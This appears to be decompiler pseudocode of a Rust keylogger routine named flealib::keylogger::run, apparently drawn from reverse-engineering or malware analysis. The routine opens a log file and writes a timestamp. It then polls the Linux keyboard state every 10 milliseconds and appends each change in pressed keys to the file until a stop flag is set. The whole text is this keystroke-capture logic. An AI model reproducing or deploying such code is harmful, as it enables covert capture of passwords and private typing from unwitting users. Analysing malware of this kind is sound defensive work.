__int64 __fastcall flealib::keylogger::run(__int128 *a1, __int64 a2)
{
  __int64 v2; // rax
  __int64 v3; // rbx
  _QWORD *v4; // r15
  __int64 v5; // rax
  __int64 v6; // rdx
  __int64 v7; // rax
  __int64 v8; // rax
  char v9; // dl
  __int64 v10; // rsi
  _BYTE v12[20]; // [rsp+Ch] [rbp-12Ch] BYREF
  _QWORD *v13; // [rsp+20h] [rbp-118h]
  __int64 v14; // [rsp+30h] [rbp-108h] BYREF
  __int64 v15; // [rsp+38h] [rbp-100h] BYREF
  __int128 v16; // [rsp+40h] [rbp-F8h] BYREF
  _QWORD *v17; // [rsp+50h] [rbp-E8h]
  __int64 v18; // [rsp+58h] [rbp-E0h]
  __int64 v19; // [rsp+60h] [rbp-D8h]
  _QWORD v20[4]; // [rsp+70h] [rbp-C8h] BYREF
  __int128 v21; // [rsp+90h] [rbp-A8h] BYREF
  _QWORD *v22; // [rsp+A0h] [rbp-98h]
  __int64 v23; // [rsp+A8h] [rbp-90h]
  __int64 v24; // [rsp+B0h] [rbp-88h]
  _QWORD v25[2]; // [rsp+E8h] [rbp-50h] BYREF
  _BYTE v26[64]; // [rsp+F8h] [rbp-40h] BYREF

  v14 = a2;
  v20[3] = a1;
  v15 = device_query::device_state::linux::DeviceState::new();
  *(_QWORD *)&v12[4] = 0LL;
  *(_QWORD *)&v12[12] = 1LL;
  v13 = 0LL;
  *(_QWORD *)&v16 = 0x1B600000000LL;
  WORD6(v16) = 1;
  DWORD2(v16) = 0x10000;
  v22 = (_QWORD *)*((_QWORD *)a1 + 2);
  v21 = *a1;
  std::fs::OpenOptions::open(v20, &v16, &v21);
  *(_QWORD *)v12 = (unsigned int)core::result::Result<T,E>::expect(v20);
  chrono::offset::local::Local::now(v26);
  *(_QWORD *)&v16 = aYMDHMS_0;
  *((_QWORD *)&v16 + 1) = 17LL;
  v17 = (_QWORD *)&byte_8;
  v18 = 0LL;
  LOBYTE(v19) = 0;
  chrono::datetime::DateTime<Tz>::format_with_items(&v21, v26, &v16);
  <T as alloc::string::SpecToString>::spec_to_string(v20, &v21);
  v25[0] = v20;
  v25[1] = <alloc::string::String as core::fmt::Debug>::fmt;
  *(_QWORD *)&v16 = &off_70B9B0;
  *((_QWORD *)&v16 + 1) = 2LL;
  v19 = 0LL;
  v17 = v25;
  v18 = 1LL;
  v2 = std::io::Write::write_fmt(v12, &v16);
  core::result::Result<T,E>::expect(v2, &off_70B9E8);
  core::ptr::drop_in_place<alloc::string::String>(v20);
  core::ptr::drop_in_place<chrono::format::formatting::DelayedFormat<chrono::format::strftime::StrftimeItems>>(&v21);
  while ( 1 )
  {
    <device_query::device_state::linux::DeviceState as device_query::device_query::DeviceQuery>::get_keys(&v16, &v15);
    v3 = *((_QWORD *)&v16 + 1);
    v4 = v17;
    v5 = <alloc::vec::Vec<T,A> as core::ops::index::Index<I>>::index(*(_QWORD *)&v12[12], v13);
    if ( !(unsigned __int8)<[A] as core::slice::cmp::SlicePartialEq<B>>::equal(v3, v4, v5, v6) && v17 )
    {
      v20[0] = &v16;
      v20[1] = <alloc::vec::Vec<T,A> as core::fmt::Debug>::fmt;
      *(_QWORD *)&v21 = asc_4FB30;
      *((_QWORD *)&v21 + 1) = 1LL;
      v24 = 0LL;
      v22 = v20;
      v23 = 1LL;
      v7 = std::io::Write::write_fmt(v12, &v21);
      core::result::Result<T,E>::expect(v7, &off_70BA00);
    }
    v22 = v17;
    v21 = v16;
    core::ptr::drop_in_place<alloc::vec::Vec<device_query::keymap::Keycode>>(&v12[4]);
    v13 = v22;
    *(_OWORD *)&v12[4] = v21;
    std::sync::mutex::Mutex<T>::lock(&v21, v14 + 16);
    v8 = core::result::Result<T,E>::unwrap(&v21);
    v10 = v9 & 1;
    if ( *(_BYTE *)(v8 + 5) )
      break;
    core::ptr::drop_in_place<std::sync::mutex::MutexGuard<flealib::keylogger::Keylogger>>(v8, v10);
    std::thread::sleep(0LL, 10000000LL);
  }
  core::ptr::drop_in_place<std::sync::mutex::MutexGuard<flealib::keylogger::Keylogger>>(v8, v10);
  core::ptr::drop_in_place<std::fs::File>(*(unsigned int *)v12);
  core::ptr::drop_in_place<alloc::vec::Vec<device_query::keymap::Keycode>>(&v12[4]);
  core::ptr::drop_in_place<device_query::device_state::linux::DeviceState>(&v15);
  return core::ptr::drop_in_place<alloc::sync::Arc<std::sync::mutex::Mutex<flealib::keylogger::Keylogger>>>(&v14);
}